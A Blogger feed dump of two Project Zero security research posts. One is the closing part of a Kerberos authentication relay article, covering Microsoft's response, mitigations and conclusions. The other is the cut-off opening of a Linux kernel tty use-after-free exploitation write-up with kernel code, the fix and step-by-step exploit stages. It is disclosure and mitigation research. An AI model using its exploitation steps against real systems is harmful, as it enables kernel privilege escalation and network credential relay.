class=\"c0\"&gt;&lt;span&gt;Therefore this would still be limited to more local attacks and only for limited sets of protocols. For example an authenticated user could register a DNS entry for the local domain using this value and trick an RPC client to connect to it using its undotted hostname. As long as the client doesn&amp;#39;t modify the name other than putting the service class on it (or it gets automatically generated by the RPC runtime) then this spoofs the SPN for the request.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.bxbpd7nw1n75\"&gt;&lt;span class=\"c6 c19\"&gt;Microsoft&amp;#39;s Response to the Research&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;I didn&amp;#39;t initially start looking at Kerberos authentication relay, as mentioned I found it inadvertently when looking at IPsec and AuthIP which I subsequently reported to Microsoft. After doing more research into other network protocols I decided to use the AuthIP issue as a bellwether on Microsoft&amp;#39;s views on whether relaying Kerberos authentication and spoofing SPNs would cross a security boundary.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;As I mentioned earlier the AuthIP issue was classed as &amp;quot;vNext&amp;quot;, which denotes it might be fixed in a future version of Windows, but not as a security update for any currently shipping version of Windows. This was because Microsoft determined it to be a Moderate severity issue (see &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2A3xt\"&gt;this&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c3\"&gt;for the explanation of the severities). Only Important or above will be serviced.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;It seems that the general rule is that any network protocol where the SPN can be spoofed to generate Kerberos authentication which can be relayed, is not sufficient to meet the severity level for a fix. However, any network facing service which can be used to induce authentication where the attacker does not have existing network authentication credentials is considered an Important severity spoofing issue and will be fixed. This is why PetitPotam was fixed as &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36942\"&gt;CVE-2021-36942&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;, as it could be exploited from an unauthenticated user.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;As my research focused entirely on the network protocols themselves and not the ways of inducing authentication, they will all be covered under the same Moderate severity. This means that if they were to be fixed at all, it&amp;#39;d be in unspecified future versions of Windows.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.7zz0k0f1r0u6\"&gt;&lt;span class=\"c6 c19\"&gt;Available Mitigations&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;How can you defend yourself against authentication relay attacks presented in this blog post? While I think I&amp;#39;ve made the case that it&amp;#39;s possible to relay Kerberos authentication, it&amp;#39;s somewhat more limited in scope than NTLM relay. This means that disabling NTLM is still an invaluable option for mitigating authentication relay issues on a Windows enterprise network. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Also, except for disabling NTLM, all the mitigations for NTLM relay apply to Kerberos relay. Requiring signing or sealing on the protocol if possible is sufficient to prevent the majority of attack vectors, especially on important network services such as LDAP.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;For TLS encapsulated protocols, channel binding prevents the authentication being relayed as I didn&amp;#39;t find any way of spoofing the TLS certificate at the same time. If the network service supports EPA, such as HTTPS or LDAPS it should be enabled. Even if the protocol doesn&amp;#39;t support EPA, enabling TLS protection if possible is still valuable. This not only provides more robust server authentication, which Kerberos mutual authentication doesn&amp;#39;t really provide, it&amp;#39;ll also hide Kerberos authentication tokens from sniffing or MitM attacks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Some libraries, such as WinHTTP and .NET set the undocumented &lt;/span&gt;&lt;span class=\"c4\"&gt;ISC_REQ_UNVERIFIED_TARGET_NAME&lt;/span&gt;&lt;span&gt;&amp;nbsp;request attribute when calling &lt;/span&gt;&lt;span class=\"c4\"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;in certain circumstances&lt;/span&gt;&lt;span class=\"c3\"&gt;. This affects the behavior of the server when querying for the SPN used during authentication. Some servers such as SMB and IIS with EPA can be configured to validate the SPN. If this request attribute flag is set then while the authentication will succeed when the server goes to check the SPN, it gets an empty string which will not match the server&amp;#39;s expectations. If you&amp;#39;re a developer you should use this flag if the SPN has been provided from an untrustworthy source, although this will only be beneficial if the server is checking the received SPN.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;A common thread through the research is abusing local DNS resolution to spoof the SPN. Disabling LLMNR and MDNS should always be best practice, and this just highlights the dangers of leaving them enabled. While it might be possible to perform the same attacks through DNS spoofing attacks, these are likely to be much less reliable than local DNS spoofing attacks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;If Windows authentication isn&amp;#39;t needed from a network client, it&amp;#39;d be wise to disable it if supported. For example, some HTTP user agents support disabling automatic Windows authentication entirely, while others such as Firefox don&amp;#39;t enable it by default. Chromium also supports disabling the DNS lookup process for generating the SPN through group policy.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Finally, blocking untrusted devices on the network such as through 802.1X or requiring authenticated IPsec/IKEv2 for all network communications to high value services would go some way to limiting the impact of all authentication relay attacks. Although of course, an attacker could still compromise a trusted host and use that to mount the attack.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.lhddftsoy07y\"&gt;&lt;span class=\"c6 c19\"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;I hope that this blog post has demonstrated that Kerberos relay attacks are feasible and just disabling NTLM is not a sufficient mitigation strategy in an enterprise environment. While DNS is a common thread and is the root cause of the majority of these protocol issues, it&amp;#39;s still possible to spoof SPNs using other protocols such as AuthIP and MSRPC without needing to play DNS tricks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;While I wrote my own tooling to perform the LLMNR attack there are various public tools which can mount an LLMNR and MDNS spoofing attack such as the venerable &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/SpiderLabs/Responder\"&gt;Python Responder&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;. It shouldn&amp;#39;t be hard to modify one of the tools to verify my findings.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;I&amp;#39;ve also not investigated every possible network protocol which might perform Kerberos authentication. I&amp;#39;ve also not looked at non-Windows systems which might support Kerberos such as Linux and macOS. It&amp;#39;s possible that in more heterogeneous networks the impact might be more pronounced as some of the security changes in Microsoft&amp;#39;s Kerberos implementation might not be present.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;If you&amp;#39;re doing your own research into this area, you should look at how the SPN is specified by the protocol, but also how the implementation builds it. For example the HTTP Negotiate RFC states how to build the SPN for Kerberos, but then each implementation does it slightly differently and not to the RFC specification.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;You should be especially wary of any protocol where an untrusted server can specify an arbitrary SPN. This is the case in AuthIP, MSRPC and DCOM. It&amp;#39;s almost certain that when these protocols were originally designed many years ago, that no thought was given to the possible abuse of this design for relaying the Kerberos network authentication. &lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/6510029969921067809/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6510029969921067809"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6510029969921067809"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html","@title":"Using Kerberos for Authentication Relay Attacks"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s72-c","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-8464515825658328843","published":"2021-10-19T09:08:00.000-07:00","updated":"2021-10-19T09:08:55.364-07:00","title":{"@type":"text","#text":" How a simple Linux kernel memory corruption bug can lead to complete system compromise"},"content":{"@type":"html","#text":"&lt;style&gt;\n  .markdown-body pre {\n    padding: 16px;\n    overflow: auto;\n    font-size: 85%;\n    line-height: 1.45;\n    background-color: #e2e2e2;\n    border-radius: 3px;\n    font-family: Consolas, monospace;\n  }\n&lt;/style&gt;\n&lt;div id=\"out\" class=\"markdown-body\"&gt;\n  &lt;h3 style='font-weight: normal; font-style: italic;'&gt;An analysis of current and potential kernel security mitigations&lt;/h3&gt;\n  &lt;p&gt;Posted by Jann Horn, Project Zero&lt;/p&gt;\n  &lt;h1&gt;Introduction&lt;/h1&gt;\n&lt;p&gt;This blog post describes a straightforward Linux kernel locking bug and how I exploited it against Debian Buster's 4.19.0-13-amd64 kernel. Based on that, it explores options for security mitigations that could prevent or hinder exploitation of issues similar to this one.&lt;/p&gt;\n&lt;p&gt;I hope that stepping through such an exploit and sharing this compiled knowledge with the wider security community can help with reasoning about the relative utility of various mitigation approaches.&lt;/p&gt;\n&lt;p&gt;A lot of the individual exploitation techniques and mitigation options that I am describing here aren't novel. However, I believe that there is value in writing them up together to show how various mitigations interact with a fairly normal use-after-free exploit.&lt;/p&gt;\n&lt;p&gt;Our bugtracker entry for this bug, along with the proof of concept, is at &lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2125\"&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=2125&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;Code snippets in this blog post that are relevant to the exploit are taken from the upstream 4.19.160 release, since that is what the targeted Debian kernel is based on; some other code snippets are from mainline Linux.&lt;/p&gt;\n&lt;p&gt;(In case you're wondering why the bug and the targeted Debian kernel are from end of last year: I already wrote most of this blogpost around April, but only recently finished it)&lt;/p&gt;\n&lt;p&gt;I would like to thank &lt;a href=\"https://twitter.com/lunixbochs\"&gt;Ryan Hileman&lt;/a&gt; for a discussion we had a while back about how static analysis might fit into static prevention of security bugs (but note that Ryan hasn't reviewed this post and doesn't necessarily agree with any of my opinions). I also want to thank &lt;a href=\"https://twitter.com/kees_cook\"&gt;Kees Cook&lt;/a&gt; for providing feedback on an earlier version of this post (again, without implying that he necessarily agrees with everything), and my Project Zero colleagues for reviewing this post and frequent discussions about exploit mitigations.&lt;/p&gt;\n&lt;h1&gt;Background for the bug&lt;/h1&gt;\n&lt;p&gt;On Linux, terminal devices (such as a serial console or a &lt;a href=\"https://en.wikipedia.org/wiki/Virtual_console\"&gt;virtual console&lt;/a&gt;) are represented by a &lt;code&gt;struct tty_struct&lt;/code&gt;. Among other things, this structure contains fields used for the &lt;a href=\"https://www.gnu.org/software/libc/manual/html_node/Job-Control.html\"&gt;job control&lt;/a&gt; features of terminals, which are usually modified using &lt;a href=\"https://man7.org/linux/man-pages/man4/tty_ioctl.4.html\"&gt;a set of ioctls&lt;/a&gt;:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;struct tty_struct {\n[...]\n        spinlock_t ctrl_lock;\n[...]\n        struct pid *pgrp;               /* Protected by ctrl lock */\n        struct pid *session;\n[...]\n        struct tty_struct *link;\n[...]\n}[...];\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The &lt;code&gt;pgrp&lt;/code&gt; field points to the foreground process group of the terminal (normally modified from userspace via the &lt;code&gt;TIOCSPGRP&lt;/code&gt; ioctl); the &lt;code&gt;session&lt;/code&gt; field points to the session associated with the terminal. Both of these fields do not point directly to a process/task, but rather to a &lt;code&gt;struct pid&lt;/code&gt;. &lt;code&gt;struct pid&lt;/code&gt; ties a specific incarnation of a numeric ID to a set of processes that use that ID as their PID (also known in userspace as TID), TGID (also known in userspace as PID), PGID, or SID. You can kind of think of it as a weak reference to a process, although that's not entirely accurate. (There's some extra nuance around &lt;code&gt;struct pid&lt;/code&gt; when &lt;code&gt;execve()&lt;/code&gt; is called by a non-leader thread, but that's irrelevant here.)&lt;/p&gt;\n&lt;p&gt;All processes that are running inside a terminal and are subject to its job control refer to that terminal as their \"controlling terminal\" (stored in &lt;code&gt;-&amp;gt;signal-&amp;gt;tty&lt;/code&gt; of the process).&lt;/p&gt;\n&lt;p&gt;A special type of terminal device are &lt;a href=\"https://man7.org/linux/man-pages/man7/pty.7.html\"&gt;pseudoterminals&lt;/a&gt;, which are used when you, for example, open a terminal application in a graphical environment or connect to a remote machine via SSH. While other terminal devices are connected to some sort of hardware, both ends of a pseudoterminal are controlled by userspace, and pseudoterminals can be freely created by (unprivileged) userspace. Every time &lt;a href=\"https://man7.org/linux/man-pages/man4/pts.4.html\"&gt;&lt;code&gt;/dev/ptmx&lt;/code&gt;&lt;/a&gt; (short for \"pseudoterminal multiplexor\") is opened, the resulting file descriptor represents the device side (referred to in documentation and kernel sources as \"&lt;a href=\"https://man7.org/linux/man-pages/man7/pty.7.html\"&gt;the pseudoterminal master&lt;/a&gt;\") of a new pseudoterminal . You can read from it to get the data that should be printed on the emulated screen, and write to it to emulate keyboard inputs. The corresponding terminal device (to which you'd usually connect a shell) is automatically created by the kernel under &lt;code&gt;/dev/pts/&amp;lt;number&amp;gt;&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;One thing that makes pseudoterminals particularly strange is that both ends of the pseudoterminal have their own &lt;code&gt;struct tty_struct&lt;/code&gt;, which point to each other using the &lt;code&gt;link&lt;/code&gt; member, even though the device side of the pseudoterminal does not have terminal features like job control - so many of its members are unused.&lt;/p&gt;\n&lt;p&gt;Many of the ioctls for terminal management can be used on both ends of the pseudoterminal; but no matter on which end you call them, they affect the same state, sometimes with minor differences in behavior. For example, in the ioctl handler for &lt;code&gt;TIOCGPGRP&lt;/code&gt;:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;/**\n *      tiocgpgrp               -       get process group\n *      @tty: tty passed by user\n *      @real_tty: tty side of the tty passed by the user if a pty else the tty\n *      @p: returned pid\n *\n *      Obtain the process group of the tty. If there is no process group\n *      return an error.\n *\n *      Locking: none. Reference to current-&amp;gt;signal-&amp;gt;tty is safe.\n */\nstatic int tiocgpgrp(struct tty_struct *tty, struct tty_struct *real_tty, pid_t __user *p)\n{\n        struct pid *pid;\n        int ret;\n        /*\n         * (tty == real_tty) is a cheap way of\n         * testing if the tty is NOT a master pty.\n         */\n        if (tty == real_tty &amp;amp;&amp;amp; current-&amp;gt;signal-&amp;gt;tty != real_tty)\n                return -ENOTTY;\n        pid = tty_get_pgrp(real_tty);\n        ret =  put_user(pid_vnr(pid), p);\n        put_pid(pid);\n        return ret;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;As documented in the comment above, these handlers receive a pointer &lt;code&gt;real_tty&lt;/code&gt; that points to the normal terminal device; an additional pointer &lt;code&gt;tty&lt;/code&gt; is passed in that can be used to figure out on which end of the terminal the ioctl was originally called. As this example illustrates, the &lt;code&gt;tty&lt;/code&gt; pointer is normally only used for things like pointer comparisons. In this case, it is used to prevent &lt;code&gt;TIOCGPGRP&lt;/code&gt; from working when called on the terminal side by a process which does not have this terminal as its controlling terminal.&lt;/p&gt;\n&lt;p&gt;Note: If you want to know more about how terminals and job control are intended to work, the book &lt;a href=\"https://man7.org/tlpi/\"&gt;\"The Linux Programming Interface\"&lt;/a&gt; provides a nice introduction to how these older parts of the userspace API are supposed to work. It doesn't describe any of the kernel internals though, since it's written as a reference for userspace programming. And it's from 2010, so it doesn't have anything in it about new APIs that have showed up over the last decade.&lt;/p&gt;\n&lt;h1&gt;The bug&lt;/h1&gt;\n&lt;p&gt;The bug was in the ioctl handler &lt;code&gt;tiocspgrp&lt;/code&gt;:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;/**\n *      tiocspgrp               -       attempt to set process group\n *      @tty: tty passed by user\n *      @real_tty: tty side device matching tty passed by user\n *      @p: pid pointer\n *\n *      Set the process group of the tty to the session passed. Only\n *      permitted where the tty session is our session.\n *\n *      Locking: RCU, ctrl lock\n */\nstatic int tiocspgrp(struct tty_struct *tty, struct tty_struct *real_tty, pid_t __user *p)\n{\n        struct pid *pgrp;\n        pid_t pgrp_nr;\n[...]\n        if (get_user(pgrp_nr, p))\n                return -EFAULT;\n[...]\n        pgrp = find_vpid(pgrp_nr);\n[...]\n        spin_lock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);\n        put_pid(real_tty-&amp;gt;pgrp);\n        real_tty-&amp;gt;pgrp = get_pid(pgrp);\n        spin_unlock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);\n[...]\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The &lt;code&gt;pgrp&lt;/code&gt; member of the terminal side (&lt;code&gt;real_tty&lt;/code&gt;) is being modified, and the reference counts of the old and new process group are adjusted accordingly using &lt;code&gt;put_pid&lt;/code&gt; and &lt;code&gt;get_pid&lt;/code&gt;; but the lock is taken on &lt;code&gt;tty&lt;/code&gt;, which can be either end of the pseudoterminal pair, depending on which file descriptor we pass to &lt;code&gt;ioctl()&lt;/code&gt;. So by simultaneously calling the &lt;code&gt;TIOCSPGRP&lt;/code&gt; ioctl on both sides of the pseudoterminal, we can cause data races between concurrent accesses to the &lt;code&gt;pgrp&lt;/code&gt; member. This can cause reference counts to become skewed through the following races:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)\n    spin_lock_irq(...)                  spin_lock_irq(...)\n    put_pid(old_pid)\n                                        put_pid(old_pid)\n    real_tty-&amp;gt;pgrp = get_pid(A)\n                                        real_tty-&amp;gt;pgrp = get_pid(B)\n    spin_unlock_irq(...)                spin_unlock_irq(...)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;pre&gt;&lt;code&gt;  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)\n    spin_lock_irq(...)                  spin_lock_irq(...)\n    put_pid(old_pid)\n                                        put_pid(old_pid)\n                                        real_tty-&amp;gt;pgrp = get_pid(B)\n    real_tty-&amp;gt;pgrp = get_pid(A)\n    spin_unlock_irq(...)                spin_unlock_irq(...)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;In both cases, the refcount of the old &lt;code&gt;struct pid&lt;/code&gt; is decremented by 1 too much, and either A's or B's is incremented by 1 too much.&lt;/p&gt;\n&lt;p&gt;Once you understand the issue, &lt;a href=\"https://git.kernel.org/linus/54ffccbf053b\"&gt;the fix&lt;/a&gt; seems relatively obvious:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;    if (session_of_pgrp(pgrp) != task_session(current))\n        goto out_unlock;\n    retval = 0;\n-   spin_lock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);\n+   spin_lock_irq(&amp;amp;real_tty-&amp;gt;ctrl_lock);\n    put_pid(real_tty-&amp;gt;pgrp);\n    real_tty-&amp;gt;pgrp = get_pid(pgrp);\n-   spin_unlock_irq(&amp;amp;tty-&amp;gt;ctrl_lock);\n+   spin_unlock_irq(&amp;amp;real_tty-&amp;gt;ctrl_lock);\n out_unlock:\n    rcu_read_unlock();\n    return retval;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h1&gt;Attack stages&lt;/h1&gt;\n&lt;p&gt;In this section, I will first walk through how my exploit works; afterwards I will discuss different defensive techniques that target these attack stages.&lt;/p&gt;\n&lt;h2&gt;Attack stage: Freeing the object with multiple dangling references&lt;/h2&gt;\n&lt;p&gt;This bug allows us to probabilistically skew the refcount of a &lt;code&gt;struct pid&lt;/code&gt; down, depending on which way the race happens: We can run colliding &lt;code&gt;TIOCSPGRP&lt;/code&gt; calls from two threads repeatedly, and from time to time that will mess up the refcount. But we don't immediately know how many times the refcount skew has actually happened.&lt;/p&gt;\n&lt;p&gt;What we'd really want as an attacker is a way to skew the refcount deterministically. We'll have to somehow compensate for our lack of information about whether the refcount was skewed successfully. We could try to somehow make the race deterministic (seems difficult), or after each attempt to skew the refcount assume that the race worked and run the rest of the exploit (since if we didn't skew the refcount, the initial memory corruption is gone, and nothing bad will happen), or we can attempt to find an information leak that lets us figure out the state of the reference count.&lt;/p&gt;\n&lt;p&gt;On typical desktop/server distributions, the following approach works (unreliably, depending on RAM size) for setting up a freed &lt;code&gt;struct pid&lt;/code&gt; with multiple dangling references:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;Allocate a new &lt;code&gt;struct pid&lt;/code&gt; (by creating a new task).&lt;/li&gt;\n&lt;li&gt;Create a large number of references to it (by sending messages with &lt;code&gt;SCM_CREDENTIALS&lt;/code&gt; to unix domain sockets, and leaving those messages queued up).&lt;/li&gt;\n&lt;li&gt;Repeatedly trigger the &lt;code&gt;TIOCSPGRP&lt;/code&gt; race to skew the reference count downwards, with the number of attempts chosen such that we expect that the resulting refcount skew is bigger than the number of references we need for the rest of our attack, but smaller than the number of extra references we created.&lt;/li&gt;\n&lt;li&gt;Let the task owning the &lt;code&gt;pid&lt;/code&gt; exit and die, and wait for RCU (read-copy-update, a mechanism that involves delaying the freeing of some objects) to settle such that the task's reference to the &lt;code&gt;pid&lt;/code&gt; is gone. (Waiting for an RCU grace period from userspace is not a primitive that is intentionally exposed through the UAPI, but there are various ways userspace can do it - e.g. by testing when a released BPF program's memory is subtracted from memory accounting, or by abusing the &lt;code&gt;membarrier(MEMBARRIER_CMD_GLOBAL, ...)&lt;/code&gt; syscall after the kernel version where RCU flavors were unified.)&lt;/li&gt;\n&lt;li&gt;Create a new thread, and let that thread attempt to drop all the references we created.&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;Because the refcount is smaller at the start of step 5 than the number of references we are about to drop, the &lt;code&gt;pid&lt;/code&gt; will be freed at some point during step 5; the next attempt to drop a reference will cause a use-after-free:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;struct upid {\n        int nr;\n        struct pid_namespace *ns;\n};\n\nstruct pid\n{\n        atomic_t count;\n        unsigned int level;\n        /* lists of tasks that use this pid */\n        struct hlist_head tasks[PIDTYPE_MAX];\n        struct rcu_head rcu;\n        struct upid numbers[1];\n};\n[...]\nvoid put_pid(struct pid *pid)\n{\n        struct pid_namespace *ns;\n\n        if (!pid)\n                return;\n\n        ns = pid-&amp;gt;numbers[pid-&amp;gt;level].ns;\n        if ((atomic_read(&amp;amp;pid-&amp;gt;count) == 1) ||\n             atomic_dec_and_test(&amp;amp;pid-&amp;gt;count)) {\n                kmem_cache_free(ns-&amp;gt;pid_cachep, pid);\n                put_pid_ns(ns);\n        }\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;When the object is freed, the SLUB allocator normally replaces the first 8 bytes (sidenote: a different position is chosen starting in 5.7, &lt;a href=\"https://outflux.net/blog/archives/2020/09/21/security-things-in-linux-v5-7/#v5.7-slub\"&gt;see Kees' blog&lt;/a&gt;) of the freed object with an XOR-obfuscated freelist pointer; therefore, the &lt;code&gt;count&lt;/code&gt; and &lt;code&gt;level&lt;/code&gt; fields are now effectively random garbage. This means that the load from &lt;code&gt;pid-&amp;gt;numbers[pid-&amp;gt;level]&lt;/code&gt; will now be at some random offset from the &lt;code&gt;pid&lt;/code&gt;, in the range from zero to 64 GiB. As long as the machine doesn't have tons of RAM, this will likely cause a kernel segmentation fault. (Yes, I know, that's an absolutely gross and unreliable way to exploit this. It mostly works though, and I only noticed this issue when I already had the whole thing written, so I didn't really want to go back and change it... plus, did I mention that it mostly works?)&lt;/p&gt;\n&lt;p&gt;Linux in its default configuration, and the configuration shipped by most general-purpose distributions, attempts to fix up unexpected kernel page faults and other types of \"oopses\" by killing only the crashing thread. Therefore, this kernel page fault is actually useful for us as a signal: Once the thread has died, we know that the object has been freed, and can continue with the rest of the exploit.&lt;/p&gt;\n&lt;p&gt;If this code looked a bit differently and we were actually reaching a double-free, the SLUB allocator would also detect that and trigger a kernel oops (see &lt;code&gt;set_freepointer()&lt;/code&gt; for the &lt;code&gt;CONFIG_SLAB_FREELIST_HARDENED&lt;/code&gt; case).&lt;/p&gt;\n&lt;h2&gt;Discarded attack idea: Directly exploiting the UAF at the SLUB level&lt;/h2&gt;\n&lt;p&gt;On the Debian kernel I was looking at, a &lt;code&gt;struct pid&lt;/code&gt; in the initial namespace is allocated from the same &lt;code&gt;kmem_cache&lt;/code&gt; as &lt;code&gt;struct seq_file&lt;/code&gt; and &lt;code&gt;struct epitem&lt;/code&gt; - these three slabs have been merged into one by &lt;code&gt;find_mergeable()&lt;/code&gt; to reduce memory fragmentation, since their object sizes, alignment requirements, and flags match:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;root@deb10:/sys/kernel/slab# ls -l pid\nlrwxrwxrwx 1 root root 0 Feb  6 00:09 pid -&amp;gt; :A-0000128\nroot@deb10:/sys/kernel/slab# ls -l | grep :A-0000128\ndrwxr-xr-x 2 root root 0 Feb  6 00:09 :A-0000128\nlrwxrwxrwx 1 root root 0 Feb  6 00:09 eventpoll_epi -&amp;gt; :A-0000128\nlrwxrwxrwx 1 root root 0 Feb  6 00:09 pid -&amp;gt; :A-0000128\nlrwxrwxrwx 1 root root 0 Feb  6 00:09 seq_file -&amp;gt; :A-0000128\nroot@deb10:/sys/kernel/slab# \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;A straightforward way to exploit a dangling reference to a SLUB object is to reallocate the object through the same &lt;code&gt;kmem_cache&lt;/code&gt; it came from, without ever letting the page reach the page allocator. To figure out whether it's easy to exploit this bug this way, I made a table listing which fields appear at each offset in these three data structures (using &lt;code&gt;pahole -E --hex -C &amp;lt;typename&amp;gt; &amp;lt;path to vmlinux debug info&amp;gt;&lt;/code&gt;):&lt;/p&gt;\n&lt;table&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n&lt;th&gt;offset&lt;/th&gt;\n&lt;th&gt;pid&lt;/th&gt;\n&lt;th&gt;eventpoll_epi / epitem &lt;strong&gt;(RCU-freed)&lt;/strong&gt;&lt;/th&gt;\n&lt;th&gt;seq_file&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n&lt;tr&gt;\n&lt;td&gt;0x00&lt;/td&gt;\n&lt;td&gt;count.counter (4) &lt;strong&gt;(CONTROL)&lt;/strong&gt;&lt;/td&gt;\n&lt;td&gt;rbn.__rb_parent_color (8) &lt;strong&gt;(TARGET?)&lt;/strong&gt;&lt;/td&gt;\n&lt;td&gt;buf (8) &lt;strong&gt;(TARGET?)&lt;/strong&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;0x04&lt;/td&gt;\n&lt;td&gt;level 